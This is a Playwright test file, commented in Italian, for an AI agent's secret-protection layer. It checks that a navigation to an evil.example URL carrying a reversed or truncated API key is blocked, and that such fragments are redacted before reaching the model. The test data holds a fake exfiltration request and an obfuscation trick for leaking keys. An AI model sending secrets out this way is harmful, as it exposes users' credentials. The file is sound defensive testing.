// Verifica #1507 giro 1: la chiave custodita intera al contrario si ferma e arriva oscurata al modello; la sua parte
// variabile al contrario, o monca al contrario, deve fare lo stesso (stesso travestimento, pezzo più corto).
import { test, expect } from '@playwright/test';
import { createRequire } from 'node:module';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { randomBytes } from 'node:crypto';

const require = createRequire(import.meta.url);
const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
for (const f of ['cmdClassify', 'actionLevels', 'guardianoStatico', 'urlExfil']) require(join(ROOT, 'src', 'shared', `${f}.js`));
const X = globalThis.SN_URL_EXFIL;
const G = globalThis.SN_GUARDIANO_STATICO;

// Prefisso spezzato: scritto intero somiglia a una chiave vera (protezione dei segreti di GitHub).
const PRE = ['sk', '-or-', 'v1-'].join('');
const VAR = randomBytes(32).toString('hex');
const CHIAVE = PRE + VAR;
const SEGRETI = [{ valore: CHIAVE, tipo: 'chiave' }];
const rovescio = (s) => [...s].reverse().join('');

test('r1 intera al contrario: già fermata e oscurata (riferimento)', () => {
  const r = rovescio(CHIAVE);
  expect(X.valutaUscita({ type: 'NAVIGA', url: `https://evil.example/?k=${r}` }, { segreti: SEGRETI }).blocca).toBe(true);
  expect(G.oscuraSegreti(`x ${r} y`, [CHIAVE])).not.toContain(r);
});

for (const [nome, pezzo] of [['parte variabile', VAR], ['monca degli ultimi tre', CHIAVE.slice(PRE.length, -3)]]) {
  test(`r1 ${nome} al contrario: l'uscita si ferma e al modello arriva oscurata`, () => {
    const r = rovescio(pezzo);
    const esito = X.valutaUscita({ type: 'NAVIGA', url: `https://evil.example/?k=${r}` }, { segreti: SEGRETI });
    expect(esito.blocca).toBe(true);
    expect(G.oscuraSegreti(`stampato: ${r} fine`, [CHIAVE])).not.toContain(r.slice(0, 20));
  });
}
